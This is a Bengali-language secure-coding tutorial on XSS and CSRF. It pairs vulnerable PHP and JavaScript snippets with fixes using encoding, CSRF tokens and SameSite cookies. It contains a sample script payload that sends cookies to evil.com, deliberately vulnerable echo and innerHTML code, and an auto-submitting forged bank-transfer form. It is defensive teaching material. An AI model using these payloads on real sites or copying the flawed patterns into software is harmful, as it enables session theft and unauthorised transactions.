# 🔓 XSS ও CSRF — Cross-Site Scripting ও Cross-Site Request Forgery

## 📌 ধারণা (Concept)

### XSS (Cross-Site Scripting)
XSS হলো এমন একটি আক্রমণ যেখানে আক্রমণকারী ওয়েব পেজে ক্ষতিকর JavaScript কোড ইনজেক্ট করে। যখন অন্য ইউজার সেই পেজ ভিজিট করে, তখন সেই ক্ষতিকর কোড ইউজারের ব্রাউজারে এক্সিকিউট হয়।

### CSRF (Cross-Site Request Forgery)
CSRF হলো এমন একটি আক্রমণ যেখানে আক্রমণকারী একজন অথেনটিকেটেড ইউজারকে দিয়ে অনিচ্ছাকৃতভাবে একটি অনুরোধ (request) পাঠায়। ইউজার জানেও না যে তার নামে একটি কাজ হয়ে গেছে।

---

## 🏠 বাস্তব জীবনের উদাহরণ

### XSS এর উদাহরণ
ধরুন একটি কমিউনিটি নোটিশ বোর্ড আছে। কেউ একটি নোটিশ লিখল যেখানে একটি লুকানো ফাঁদ আছে — যে কেউ সেই নোটিশ পড়বে, তার পকেট থেকে চাবি চুরি হয়ে যাবে। এটাই XSS — ওয়েবপেজে ক্ষতিকর স্ক্রিপ্ট রেখে দেওয়া।

### CSRF এর উদাহরণ
ধরুন আপনি ব্যাংকে লগইন অবস্থায় আছেন। কেউ আপনাকে একটি লিংক পাঠাল — আপনি ক্লিক করতেই আপনার ব্যাংক একাউন্ট থেকে টাকা ট্রান্সফার হয়ে গেল। কারণ ব্যাংক ভেবেছে আপনিই রিকোয়েস্ট পাঠিয়েছেন।

---

## 🔴 XSS — তিন ধরনের আক্রমণ

### ১. Stored XSS (স্থায়ী XSS)
ক্ষতিকর স্ক্রিপ্ট ডাটাবেসে সংরক্ষিত হয়।

```php
// ❌ খারাপ — ইউজারের ইনপুট সরাসরি আউটপুটে দেখানো
echo "<div class='comment'>" . $_POST['comment'] . "</div>";
// ইউজার ইনপুট দিতে পারে: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// ✅ ভালো — HTML এনকোডিং ব্যবহার
echo "<div class='comment'>" . htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8') . "</div>";
```

```javascript
// ❌ খারাপ — innerHTML দিয়ে ইউজার ডেটা রেন্ডার
commentDiv.innerHTML = userComment;

// ✅ ভালো — textContent ব্যবহার
commentDiv.textContent = userComment;

// ✅ অথবা DOMPurify লাইব্রেরি ব্যবহার
import DOMPurify from 'dompurify';
commentDiv.innerHTML = DOMPurify.sanitize(userComment);
```

### ২. Reflected XSS (প্রতিফলিত XSS)
ক্ষতিকর স্ক্রিপ্ট URL প্যারামিটার থেকে আসে।

```php
// ❌ খারাপ — URL প্যারামিটার সরাসরি পেজে দেখানো
echo "আপনি খুঁজেছেন: " . $_GET['search'];

// ✅ ভালো — এনকোড করে দেখানো
echo "আপনি খুঁজেছেন: " . htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
```

### ৩. DOM-Based XSS
ক্লায়েন্ট-সাইড JavaScript এ ঘটে।

```javascript
// ❌ খারাপ — URL হ্যাশ সরাসরি DOM এ ইনজেক্ট
document.getElementById('output').innerHTML = location.hash.substring(1);

// ✅ ভালো — textContent ব্যবহার ও স্যানিটাইজ
const sanitized = location.hash.substring(1).replace(/[<>"'&]/g, '');
document.getElementById('output').textContent = decodeURIComponent(sanitized);
```

---

## 🔴 CSRF — আক্রমণ ও প্রতিরোধ

### CSRF আক্রমণের উদাহরণ

```html
<!-- আক্রমণকারীর সাইটে এই ফর্ম আছে -->
<form action="https://bank.com/transfer" method="POST" id="evil-form">
    <input type="hidden" name="to" value="attacker-account" />
    <input type="hidden" name="amount" value="100000" />
</form>
<script>document.getElementById('evil-form').submit();</script>
```

### PHP তে CSRF প্রতিরোধ — CSRF Token

```php
// টোকেন জেনারেট করা (ফর্ম রেন্ডারের সময়)
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// ফর্মে টোকেন যুক্ত করা
function csrfField() {
    return '<input type="hidden" name="csrf_token" value="' 
        . htmlspecialchars($_SESSION['csrf_token']) . '">';
}

// টোকেন যাচাই করা (ফর্ম সাবমিটের সময়)
function validateCsrfToken() {
    if (!isset($_POST['csrf_token']) || !isset($_SESSION['csrf_token'])) {
        http_response_code(403);
        die('CSRF টোকেন অনুপস্থিত');
    }
    if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        http_response_code(403);
        die('CSRF টোকেন মিলছে না');
    }
    // ব্যবহারের পর নতুন টোকেন তৈরি
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

### JavaScript (Express.js) এ CSRF প্রতিরোধ

```javascript
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

const app = express();
app.use(cookieParser());

const csrfProtection = csrf({ cookie: true });

// ফর্ম পেজে CSRF টোকেন পাঠানো
app.get('/form', csrfProtection, (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});

// ফর্ম সাবমিটে CSRF টোকেন যাচাই
app.post('/transfer', csrfProtection, (req, res) => {
    // CSRF টোকেন স্বয়ংক্রিয়ভাবে যাচাই হবে
    processTransfer(req.body);
    res.json({ success: true });
});

// CSRF এরর হ্যান্ডলিং
app.use((err, req, res, next) => {
    if (err.code === 'EBADCSRFTOKEN') {
        return res.status(403).json({ error: 'CSRF টোকেন অবৈধ' });
    }
    next(err);
});
```

### SameSite Cookie দিয়ে CSRF প্রতিরোধ

```php
// PHP তে SameSite cookie সেট করা
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict' // বা 'Lax'
]);
session_start();
```

```javascript
// Express.js এ SameSite cookie
app.use(session({
    secret: process.env.SESSION_SECRET,
    cookie: {
        secure: true,
        httpOnly: true,
        sameSite: 'strict',
        maxAge: 3600000
    }
}));
```

---

## ✅ কখন ব্যবহার করবেন

- **XSS প্রতিরোধ:** যেকোনো জায়গায় যেখানে ইউজারের ইনপুট HTML এ দেখানো হয়
- **CSRF প্রতিরোধ:** যেকোনো state-changing অপারেশনে (POST, PUT, DELETE)
- প্রতিটি ফর্ম সাবমিশনে CSRF টোকেন ব্যবহার করুন
- Content Security Policy (CSP) হেডার ব্যবহার করুন

## ❌ কখন ব্যবহার করবেন না

- **CSRF টোকেন:** GET রিকোয়েস্টে প্রয়োজন নেই (GET দিয়ে state পরিবর্তন করা উচিত নয়)
- **অতিরিক্ত স্যানিটাইজেশন:** ডেটা যদি শুধু ডাটাবেসে থাকে এবং কখনো HTML এ রেন্ডার না হয়, তাহলে HTML encoding প্রয়োজন নেই
- API-only ব্যাকেন্ডে CSRF token এর বদলে JWT বা API key ব্যবহার করা যেতে পারে
